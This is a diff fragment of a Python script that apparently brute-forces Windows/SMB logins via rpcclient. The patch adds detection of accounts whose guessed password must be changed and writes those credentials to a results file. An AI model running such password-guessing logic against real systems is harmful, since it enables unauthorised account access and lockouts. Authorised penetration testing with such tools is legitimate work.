@@ -250,7 +250,7 @@ try:
                         except: pass
                     child = pexpect.spawn("rpcclient -U '%s%%%s' %s" % (user_fixed, password, ip))
                     i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED',
-                                      'NT_STATUS_ACCOUNT_LOCKED_OUT', 'NT_STATUS_ACCOUNT_DISABLED', 'NT_STATUS_LOGON_TYPE_NOT_GRANTED'])
+                                      'NT_STATUS_ACCOUNT_LOCKED_OUT', 'NT_STATUS_PASSWORD_MUST_CHANGE', 'NT_STATUS_ACCOUNT_DISABLED', 'NT_STATUS_LOGON_TYPE_NOT_GRANTED'])
 
                     # login failed for this one
                     if i == 0:
@@ -266,8 +266,7 @@ try:
 
                     # if account expired
                     if i == 2:
-                        print "[-] Successfully guessed username: %s with password of: %s \
-                              however, it is set to expired." % (user, password)
+                        print "[-] Successfully guessed username: %s with password of: %s however, it is set to expired." % (user, password)
                         filewrite.write("username: %s password: %s\n" % (user, password))
                         success = True
                         child.kill(0)
@@ -277,6 +276,14 @@ try:
                         print "[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. \
                                You may be locking accounts out!"
                         child.kill(0)
+
+                    # if account change is needed
+                    if i == 4:
+                        print "[*] Successfully guessed password but needs changed. Username: %s with password of: %s" % (user,password)
+                        filewrite.write("CHANGE PASSWORD NEEDED - username: %s password: %s\n" % (user, password))
+                        success = True
+                        child.kill(0)
+
         filewrite.close()
         # if we got lucky
         if success:
